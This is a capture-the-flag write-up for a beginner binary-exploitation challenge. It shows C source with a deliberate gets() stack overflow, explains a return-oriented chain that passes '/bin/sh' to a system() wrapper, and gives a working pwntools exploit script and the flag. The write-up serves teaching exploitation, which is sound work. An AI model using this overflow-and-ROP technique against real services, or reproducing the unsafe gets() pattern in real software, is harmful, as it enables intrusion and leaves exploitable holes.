`Binary`
This challenge was meant to be a somewhat simple binary exploitation challenge so that people could have a go at getting some nice points in a category you might not have done before!
```c
#include <stdio.h>
#include <stdlib.h>

// gcc -fno-stack-protector return.c -no-pie -o return

int a,b,c,d,e,f = 0;
char* shell = "/marius";

void gadget() {
    asm volatile (
        "popq %%rdi \n\t"
        "ret \n\t"
        :
        :
        : "rdi"
    );
}

void one(int* val) {
    *val = 1;
}
void two(int* val) {
    *val = 2;
}
void three(int* val) {
    *val = 3;
}
void four(int* val) {
    *val = 4;
}
void five(int* val) {
    *val = 5;
}
void six(int* val) {
    *val = 6;
}
void set_shell() {
    shell = "/bin/sh";
    if (a != 1 && b != 2 && c != 3 &&
        d != 4 && e != 5 && f != 6) {
        printf("Sorry!\n");
        exit(-1);
    }
}

void run(char* cmd) {
    system(cmd);
}

int main() {
    char overflowable[27];

    printf("Welcome to PWN!\n");
    printf("Now jump around and get a shell!\n");

    gets(overflowable);
}
```
Reading the code a plan comes to mind. We want to call `run("/bin/sh")`. We look at `set_shell()`, and it seems like we need to make a = 1, b = 2, .. and so on. To do this we should probably do something like:

1. Call one(a);
2. Call two(b);

This will work, and is a valid solution. However! The simpler way is realizing that `/bin/sh` will be put in the `.bss` section, and thus we have the address. The idea here is:
```
POP RDI + address of /bin/sh
RUN
```
And you win!
```python
#!/usr/bin/env python3
from pwn import *
import ctypes

io = remote("127.0.0.1", 1341)

def pwn():
    pop_rdi = 0x4005fa
    ret = 0x4005fb
    binsh = 0x4007d0
    run = 0x4006f8

    io.sendline(b"A"*0x28 + p64(ret) +  p64(pop_rdi) + p64(binsh) + p64(run))
    io.interactive()

if __name__ == "__main__":
    pwn()
```
We have the extra ret because of the stack needing to be 16-byte aligned. (https://stackoverflow.com/questions/67243284/why-movaps-causes-segmentation-fault)

Flag:
`TDCNET{you_d0nt_n33d_t0_s3t_4bcd3f_wh3n_n0_p1E!!}`
